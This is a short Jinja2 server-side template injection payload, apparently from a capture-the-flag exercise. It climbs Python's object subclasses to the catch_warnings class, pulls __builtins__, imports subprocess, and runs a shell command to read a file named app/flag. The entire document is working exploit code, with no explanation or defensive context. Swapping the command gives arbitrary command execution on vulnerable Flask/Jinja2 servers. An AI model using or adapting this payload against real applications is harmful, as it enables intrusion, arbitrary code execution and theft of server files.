{% set loadedClasses = ''.__class__.__mro__[1].__subclasses__() %} 
{% for loadedClass in loadedClasses %} 
	{% if loadedClass.__name__ == 'catch_warnings' %} 
		{% set builtinsReference = loadedClass()._module.__builtins__ %} 
		{% set os = builtinsReference['__import__']('subprocess') %}
		{{ os.check_output('cat app/flag', shell=True) }}
	{% endif %} 
{% endfor %} 